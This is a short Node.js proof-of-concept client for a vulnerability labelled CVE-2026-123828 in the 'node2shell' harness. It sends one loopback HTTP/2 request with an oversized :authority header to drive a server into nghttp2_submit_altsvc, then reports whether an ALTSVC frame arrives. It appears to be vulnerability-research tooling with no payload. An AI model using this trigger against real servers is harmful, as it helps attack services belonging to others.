// node2shell rung-1 harness — client side (CVE-2026-123828)
//
// Loopback-only single-shot HTTP/2 client: one request with a long
// syntactically valid :authority of the requested length, then waits
// for the server's ALTSVC frame (proof the full trigger path executed
// through nghttp2_submit_altsvc) or timeout.
//
// Usage: node node2shell-rung1-client.js <port> <authority_len>

'use strict';
const http2 = require('http2');

const port = Number(process.argv[2]);
const n = Number(process.argv[3]);
if (!port || !n) {
  console.log('usage: node node2shell-rung1-client.js <port> <authority_len>');
  process.exit(1);
}

const authority = 'a'.repeat(n);
const client = http2.connect('http://127.0.0.1:' + port);

client.on('error', (e) => {
  console.log('CLIENT-ERROR ' + e.message);
  process.exit(1);
});

client.on('altsvc', (alt, origin, stream) => {
  console.log('ALTSVC alt=' + alt + ' origin_len=' + origin.length +
              ' stream=' + stream);
  client.destroy();
  process.exit(0);
});

const req = client.request({ ':authority': authority });
req.resume();
req.on('end', () => {});

setTimeout(() => {
  console.log('TIMEOUT');
  process.exit(2);
}, 10000).unref();
